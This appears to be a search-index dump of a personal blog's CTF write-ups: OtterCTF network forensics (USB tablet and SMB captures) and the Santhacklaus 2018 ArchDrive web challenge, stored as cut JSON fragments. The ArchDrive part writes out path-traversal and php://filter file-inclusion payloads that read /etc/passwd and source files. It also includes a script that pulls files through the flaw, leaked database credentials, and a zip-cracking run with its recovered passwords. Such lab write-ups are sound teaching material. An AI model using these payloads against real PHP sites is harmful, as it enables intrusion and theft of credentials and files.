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","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:1:2","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"Flag Can you see the flag? Just pick the first character of each line: CTF{EmiNeM_FOR_LifE_gEez} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:1:3","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"Look at me I did this challenge after the CTF ending. Wacom CTL 471 is a graphical tablet. Based on those piece of information, I looked on the internet a CTF writeup. I finally found a writeup of “Tom and Jerry” challenge from BITSCTF: https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/ ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:2:0","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"Data extraction Frames containing the most interesting data got the following syntax: 02:f1:d9:22:1c:25:4d:03:2b:00 Here is parsing of this frame: 02:f1 -\u003e Header 50:1d -\u003e X 72:1a -\u003e Y 00:00 -\u003e Pressure 2b:00 -\u003e Suffix It’s possible to extract all frames with the following tshark command: $ tshark -r lookatme.pcapng -Y '((usb.transfer_type == 0x01) \u0026\u0026 (frame.len == 37))' -Tfields -e usb.capdata \u003e capdata The first condition usb.transfer_type is used to filter the data on sending packets, not the response. It’s like filtering on echo request for ICMP data. The second statement filter on data length. ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:2:1","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"Data decoding As mentioned in previous writeups, it’s necessary to consider all axis, X, Y, and Z. Parsing data is possible with a little awk command, shamefully stolen from the BITSCTF writeup: $ awk -F: '{x=$3$4;y=$5$6}{z=$7}$1==\"02\"{print x,y,z}' capdata \u003e hex_value And decoding data with a python script, still stolen from the previous write-up: #!/usr/bin/python from pwn import * f = open('data_plot','w') for i in open('hex2').readlines(): ii = i.strip().split(' ') x = int(ii[0], 16) y = int(ii[1], 16) z = int(ii[2], 16) if z \u003e 0: f.write(\"{0} {1}\\n\".format(u16(struct.pack(\"\u003eH\", x)), u16(struct.pack(\"\u003eH\", y)))) With the last statement I ensure that data contains pressure, it prevents from some garbage during decoding. After that, just use gnuplot to visualize the data: $ gnuplot $ plot \"data_plot\" ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:2:2","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"Flag If I edit the picture a bit, it gives me: CTF{0TR_U58} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:2:3","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"Otter Leak For this challenge, I was really lucky. When I opened the PCAP file in my Wireshark I immediately notice some data sent through SMBv2. I configured one column of my Wireshark to display data transferred: data.data: ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:3:0","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"Extraction and decoding time Let’s use tshark: $ tshark -r OtterLeak.pcap -Y 'smb2 \u0026\u0026 data.data' -Tfields -e data.data | tr -d ' \\n' | xxd -r -p =0iLu4iLg4iLu4SLg4iLu0CIu0CIu4CIu0iLg0SLu4iLg4iLu0SLg0CIt0SLg4CIu4iLu4CIu0iLg0SLt0SLg0SL It looks to be upside down base64, by putting it back in the right place, I will try to decode it: $ cat rev_b64| rev | base64 -d -- ----- .-. ..... . --- - --... ...-- .-. .. -. -... -.... ....- Great, morse code. I should be on the right path. dcode website offers morse decoder: ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:3:1","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"Flag CTF{M0R5EOT73RINB64} To conclude this little paper, the OtterCTF was an amazing CTF for forensic lovers. Honestly, I really liked it! If you have any question about this article, feel free to contact me on twitter @Maki_chaz. Thanks for reading, and merry Christmas guys :) ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:3:2","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"ArchDrive 1/3 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:1:0","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Statement ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:1:1","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"State of the art This comes with a really good looking website: I notice a strange GET parameter when clicking on Reset it: https://archdrive.santhacklaus.xyz/?page=reset.php ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:1:2","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Basic local file inclusion I tried to include /etc/passwd file: https://archdrive.santhacklaus.xyz/?page=../../../../../../../../../etc/passwd root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt❌100:65534::/nonexistent:/bin/false G0lD3N_Us3r❌1000:1000:IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r},,,:/home/G0lD3N_Us3r:/bin/bash w00t! ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:1:3","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Flag IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:1:4","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"ArchDrive 2/3 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:2:0","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Statement ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:2:1","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"State of the art Ok, we got a Local file inclusion, let’s try to use the base64 php wrapper (go on payload all the things): https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=reset.php It gives me some base64 data, here is the decoded data: \u003c?php session_start(); ?\u003e \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003ctitle\u003eReset Your Password\u003c/title\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e \u003clink rel=\"icon\" type=\"image/png\" href=\"images/icons/favicon.ico\"/\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/bootstrap/css/bootstrap.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"fonts/font-awesome-4.7.0/css/font-awesome.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"fonts/iconic/css/material-design-iconic-font.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/animate/animate.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/css-hamburgers/hamburgers.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/animsition/css/animsition.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/select2/select2.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/daterangepicker/daterangepicker.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"css/util.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"limiter\"\u003e \u003cdiv class=\"container-login100\"\u003e \u003cdiv class=\"wrap-login100\"\u003e \u003cform class=\"login100-form validate-form\" method=\"post\" action=\"?page=reset.php\"\u003e \u003cspan class=\"login100-form-title p-b-48\"\u003e \u003ca href=\"index.php\"\u003e\u003cimg class=\"logo-brand\" src=\"images/archdrive-color.png\" alt=\"ArchDrive logo\"\u003e\u003c/a\u003e \u003c/span\u003e \u003cspan class=\"login100-form-title p-b-26\"\u003e ArchDrive \u003c/span\u003e \u003cp class=\"login100-form-title\" style=\"font-size: 24px\"\u003eReset My Password\u003c/p\u003e\u003c/br\u003e \u003c?php if(isset($_POST['recover'])) { ?\u003e \u003cp\u003eEmail sent !\u003c/p\u003e \u003c?php } ?\u003e \u003cdiv class=\"wrap-input100 validate-input\" data-validate = \"Valid email is: a@b.c\"\u003e \u003cinput class=\"input100\" type=\"text\" name=\"email\"\u003e \u003cspan class=\"focus-input100\" data-placeholder=\"Email (only from @archdrive.corp)\"\u003e\u003c/span\u003e \u003c/div\u003e \u003cdiv class=\"container-login100-form-btn\"\u003e \u003cdiv class=\"wrap-login100-form-btn\"\u003e \u003cdiv class=\"login100-form-bgbtn\"\u003e\u003c/div\u003e \u003cbutton class=\"login100-form-btn\" name=\"recover\"\u003eRecover Password\u003c/button\u003e \u003c/div\u003e \u003c/div\u003e \u003c/form\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv id=\"dropDownSelect1\"\u003e\u003c/div\u003e \u003cscript src=\"vendor/jquery/jquery-3.2.1.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"vendor/animsition/js/animsition.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"vendor/bootstrap/js/popper.js\"\u003e\u003c/script\u003e \u003cscript src=\"vendor/bootstrap/js/bootstrap.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"vendor/select2/select2.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"vendor/daterangepicker/moment.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"vendor/daterangepicker/daterangepicker.js\"\u003e\u003c/script\u003e \u003cscript src=\"vendor/countdowntime/countdowntime.js\"\u003e\u003c/script\u003e \u003cscript src=\"js/main.js\"\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:2:2","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Local file inclusion The index.php file doesn’t work, I didn’t succeed to extracted it. Nevermind, there is a login.php file, found in the index form: Then: https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=login.php \u003c?php session_start(); $state = new \\stdClass(); if ( isset($_POST['email']) \u0026\u0026 !empty($_POST['email']) ) { if ( isset($_POST['pass']) \u0026\u0026 !empty($_POST['pass']) ) { $bdd = mysqli_connect('database:3306', 'archdrive-corpo-bdd-admin', '8mkxdcwwyvtk36snF2b4TcEqSjh4Cc', 'ctf-archdrive-corp'); if (mysqli_connect_errno()) { $state-\u003ereturn = 'error'; $state-\u003estring = 'Connection error'; $state_json = json_encode($state); echo $state_json; return; } $user = mysqli_real_escape_string($bdd, strtolower($_POST['email'])); $pass = $_POST['pass']; $sql = \"SELECT user,password FROM `access-users` WHERE user='\".$user.\"' AND password='\".$pass.\"'\"; $res = mysqli_query($bdd, $sql); $num_row = mysqli_num_rows($res); $row=mysqli_fetch_assoc($res); if ( $num_row == 1 \u0026\u0026 $user === $row['user']) { $state-\u003ereturn = 'true'; $_SESSION['logged'] = 1; header(\"Location: myfiles.php\"); } else { $state-\u003ereturn = 'false'; header(\"Location: index.php\"); } } } ?\u003e Great, new file appeared: myfiles.php https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=myfiles.php \u003c?php session_start(); if($_SESSION['logged'] === 1) { ?\u003e \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003ctitle\u003eMy Files\u003c/title\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e \u003clink rel=\"icon\" type=\"image/png\" href=\"images/icons/favicon.ico\"/\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/bootstrap/css/bootstrap.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"fonts/font-awesome-4.7.0/css/font-awesome.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"fonts/iconic/css/material-design-iconic-font.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/animate/animate.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/css-hamburgers/hamburgers.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/animsition/css/animsition.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/select2/select2.min.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"vendor/daterangepicker/daterangepicker.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"css/util.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"limiter\"\u003e \u003cdiv class=\"container-login100\"\u003e \u003cdiv class=\"wrap-login100\"\u003e \u003cspan class=\"login100-form-title p-b-48\"\u003e \u003ca href=\"index.php\"\u003e\u003cimg class=\"logo-brand\" src=\"images/archdrive-color.png\" alt=\"ArchDrive logo\"\u003e\u003c/a\u003e \u003c/span\u003e \u003cspan class=\"login100-form-title p-b-26\"\u003e ArchDrive \u003c/span\u003e \u003cp class=\"login100-form-title\" style=\"font-size: 24px\"\u003eMy Recent Documents\u003c/p\u003e\u003c/br\u003e \u003cul\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c8295b964d159a14491/rib-bnp.gif\"\u003erib-bnp.gif\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c8295b964d159a14491/test.html\"\u003etest.html\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"images/vacances1.jpg\"\u003eVacances_2018_1.jpg\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c8295b964d159a14491/CONFIDENTIEL.zip\"\u003eCONFIDENTIEL.zip\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c8295b964d159a14491/facture_mobile_sfr.png\"\u003efacture_mobile_sfr.png\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c8295b964d159a14491/camel.jpg\"\u003ecamel.jpg\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c8295b964d159a14491/cat.jpg\"\u003ecat.jpg\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c8295b964d159a14491/documents\"\u003edocuments\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c8295b964d159a14491/funny_wtf.jpg\"\u003efunny_wtf.jpg\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c8295b964d159a14491/freshandhappy.mp3\"\u003efreshandhappy.mp3\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c8295b964d159a14491/intense.mp3\"\u003eintense.mp3\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c8295b964d159a14491/recup.zip\"\u003erecup.zip\u003c/a\u003e\u003c/li\u003e \u003cli\u003e\u003ca class=\"txt2\" href=\"21f64da1e5792c829","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:2:3","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"File extraction Ok, now I think I’m seeing files stored in the drive, I made a little script to extract them: #!/usr/bin/python2 import requests import base64 file_list = ['21f64da1e5792c8295b964d159a14491/rib-bnp.gif', '21f64da1e5792c8295b964d159a14491/test.html', 'images/vacances1.jpg', '21f64da1e5792c8295b964d159a14491/CONFIDENTIEL.zip', '21f64da1e5792c8295b964d159a14491/facture_mobile_sfr.png', '21f64da1e5792c8295b964d159a14491/camel.jpg', '21f64da1e5792c8295b964d159a14491/cat.jpg', '21f64da1e5792c8295b964d159a14491/funny_wtf.jpg', '21f64da1e5792c8295b964d159a14491/freshandhappy.mp3', '21f64da1e5792c8295b964d159a14491/intense.mp3', '21f64da1e5792c8295b964d159a14491/recup.zip', '21f64da1e5792c8295b964d159a14491/funny.jpg', '21f64da1e5792c8295b964d159a14491/goats.jpg', '21f64da1e5792c8295b964d159a14491/lol.jpg', '21f64da1e5792c8295b964d159a14491/rapport_SM.pdf', '21f64da1e5792c8295b964d159a14491/these.pdf', '21f64da1e5792c8295b964d159a14491/these-2.pdf', '21f64da1e5792c8295b964d159a14491/wallpaper.jpg', '21f64da1e5792c8295b964d159a14491/VeraCrypt.zip','21f64da1e5792c8295b964d159a14491/media','21f64da1e5792c8295b964d159a14491/documents'] for i in file_list: r = requests.get(\"https://archdrive.santhacklaus.xyz/index.php?page=pHp://FilTer/convert.base64-encode/resource=\"+str(i)) data = base64.b64decode(r.text.split('\\r\\n')[-1].replace(' ','')) filename = i.replace('/','_') print(\"[+] Result written in: {0}\".format(filename)) f = open(filename, 'wb') f.write(data) f.close() The CONFIDENTIEL.zip contains garbage, nothing usefull. But the recup.zip is encrypted! ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:2:4","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Bruteforce time I got an encrypted zip file, I got a wordlist, let’s call fcrackzip: $ fcrackzip -v -D -u -p /home/maki/Tools/wordlist/rockyou.txt 21f64da1e5792c8295b964d159a14491_recup.zip found file 'password.txt', (size cp/uc 271/ 377, flags 9, chk 5aec) PASSWORD FOUND!!!!: pw == hackerman $ unzip 21f64da1e5792c8295b964d159a14491_recup.zip Archive: 21f64da1e5792c8295b964d159a14491_recup.zip [21f64da1e5792c8295b964d159a14491_recup.zip] password.txt password: hackerman inflating: password.txt $ cat password.txt === FLAG === IMTLD{F1nd_Y0uR_W4y} ==== Facebook === P@ssw0rd123 === Twitter === azertY#!?$ === Job === Door: 5846 Computer: 0112#aqzsed === zip === ohm0-9Quirk Finny5-polo2-Rule === VC === 7Rex-Mazda0-hover1-Quid Gourd-crown2-gao4-warp2 - Take On Me 0twain-Mao0-flash-6Goof-Gent === Portable === Windobe123 === iPhone === 123789 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:2:5","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Flag IMTLD{F1nd_Y0uR_W4y} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:2:6","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"ArchDrive 3/3 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:3:0","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Statement ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:3:1","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - 